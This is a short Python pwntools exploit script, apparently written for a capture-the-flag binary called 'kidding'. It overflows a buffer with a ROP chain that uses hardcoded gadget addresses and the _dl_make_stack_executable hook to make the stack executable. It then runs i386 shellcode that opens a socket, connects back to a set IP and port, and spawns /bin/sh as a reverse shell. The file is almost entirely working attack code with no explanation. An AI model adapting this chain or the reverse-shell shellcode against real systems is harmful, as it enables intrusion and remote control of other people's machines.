from pwn import *
p = process("./kidding")
IP = '127.0.0.1'
PORT = 26112
table_addr = {"mprotect" : 0x806DD40, 'pop_eax_ret' : 0x80b8536, 'pop_ebx_edx_ret' : 0x806ec8a, 'pop_ecx_ret' : 0x080583c9, 
'pop_ecx_ebx_ret' : 0x0806ecb1, 'pop_ebx_ret' : 0x805c1d1, 'int_0x80' : 0x806f290, 'jmp_esp' : 0x80ddd07, 'dl_stack_executable' : 0x80937F0,
'libc_stack_end':0x8048902, 'sub_eax_ecx_ret':0x080616c8,'push_eax_ret' : 0x80e55d0, '_dl_make_stack_executable_hook':0x80EA9F4, 'inc_ecx_ret':0x80a18b7}
table_syscall = {'brk':45,'mprotect':125, 'execve' : 11,'read': 5}
payload = ''
# payload += '\x02\xff'
# payload += p16(PORT,endian='big')
# payload += binary_ip(IP)
# payload += '\x00'*(12-len(payload))
# payload += p32(table_addr['pop_ebx_edx_ret'])
# payload += p32(0xff800000)
# payload += p32(7)
# payload += p32(table_addr['pop_ecx_ret'])
# payload += p32(0x7f0000)
# payload += p32(table_addr['pop_eax_ret'])
# payload += p32(table_syscall['mprotect'])
# payload += p32(table_addr['int_0x80'])
# payload += p32(table_addr['jmp_esp'])
payload = ''
payload += 'a'*8
payload += p32(table_addr['libc_stack_end']-0x18)
payload += p32(table_addr['pop_ecx_ret'])
payload += p32(table_addr['_dl_make_stack_executable_hook'])
payload += p32(table_addr['inc_ecx_ret'])
payload += p32(table_addr['dl_stack_executable'])
payload += p32(table_addr['jmp_esp'])



sc =''
sc += 'push 0x1;pop ebx;cdq;'
sc += 'mov al, 0x66; push edx; push ebx; push 0x2; mov ecx, esp; int 0x80;'
sc += 'pop esi; pop ecx; xchg ebx, eax; loop: mov al, 0x3f; int 0x80; dec ecx; jns loop;'
sc += 'mov al, 0x66; push %d; push ax; push si; mov ecx, esp;'%(u32(binary_ip(IP)))
sc += 'push 0x10; push ecx; push ebx; mov ecx, esp; mov bl, 0x3; int 0x80;'
sc += 'mov al, 11; pop ecx; push 0x0068732f; push 0x6e69622f; mov ebx, esp; int 0x80;'
# shellcode += asm('''
#     push 0x1;
# '''%(   u32(binary_ip(IP)), u32(p16(PORT,endian='big').rjust(4,'\x00')) )
# )
payload += asm(sc,arch='i386')
print(len(payload))
raw_input()
p.sendline(payload)
p.interactive()

